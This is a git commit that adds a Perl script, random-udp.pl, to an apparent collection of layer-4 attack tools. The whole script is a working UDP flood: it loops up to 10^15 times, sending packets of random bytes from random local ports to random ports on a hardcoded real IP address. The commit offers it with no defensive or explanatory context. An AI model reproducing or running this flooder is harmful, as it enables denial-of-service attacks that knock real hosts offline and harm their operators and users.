a60efc7f60290aa643a862897e61f5e7d5549e53
Neeraj Rathee <42605479+cyberceros@users.noreply.github.com>
2023-04-15 21:04:33 +0530

    Create random-udp.pl

---
+++ Layer4/UDP/random-udp.pl
@@ -0,0 +1,20 @@
+#!/usr/bin/perl
+use strict;
+use warnings;
+use Socket;
+
+my $target_host = "64.227.153.230";
+my $max_size = 100;
+my $min_size = 50;
+my $packet_count = 1000000000000000;
+
+for (my $i = 0; $i < $packet_count; $i++) {
+    my $local_port = int(rand(65535));
+    my $target_port = int(rand(65535));
+    my $packet_size = int(rand($max_size - $min_size + 1)) + $min_size;
+    my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
+    socket(my $socket, PF_INET, SOCK_DGRAM, getprotobyname('udp'));
+    bind($socket, sockaddr_in($local_port, INADDR_ANY));
+    send($socket, pack("a$packet_size", $packet_data), 0, sockaddr_in($target_port, inet_aton($target_host)));
+    close($socket);
+}
